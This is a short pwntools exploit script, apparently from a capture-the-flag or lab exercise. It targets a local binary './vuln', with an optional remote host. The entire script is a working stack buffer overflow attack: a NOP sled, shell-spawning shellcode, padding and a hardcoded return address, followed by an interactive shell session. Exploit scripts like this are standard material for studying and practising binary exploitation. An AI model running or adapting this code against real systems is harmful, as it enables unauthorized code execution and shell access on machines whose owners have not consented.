from pwn import *

#REMOTE = True				# test remote
REMOTE = False				# test local

elf = ELF("./vuln")

if REMOTE :
#	p = remote('10.10.10.147',1337)	# test remote
	p = remote('',1337)		# test local
else:
	p = process('./vuln')

payload = b'\x90' * 240			# The NOPs
payload += asm(shellcraft.sh())		# The shellcode
payload = payload.ljust(312, b'A')	# Junk
payload += p32(0xffffd6e4 + 120)	# Address of the Shellcode

p.recvline()
p.sendline(payload)
p.interactive()
